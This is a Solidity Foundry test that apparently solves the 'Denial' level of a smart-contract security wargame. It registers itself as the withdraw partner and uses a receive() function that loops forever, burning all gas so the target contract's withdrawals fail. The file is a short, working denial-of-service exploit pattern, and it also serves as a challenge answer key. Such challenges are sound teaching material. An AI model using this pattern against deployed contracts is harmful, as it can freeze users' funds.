// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./DenialFactory.sol";

contract DenialTest is Test {
    DenialFactory factory;

    function setUp() public {
        factory = new DenialFactory();
    }

    function testDenial() public {
        address payable instance = payable(factory.createInstance{value: 0.001 ether}(address(this)));

        Denial(instance).setWithdrawPartner(address(this));

        assertTrue(factory.validateInstance(instance, address(this)));
    }

    receive() external payable {
        while (true) {}
    }
}
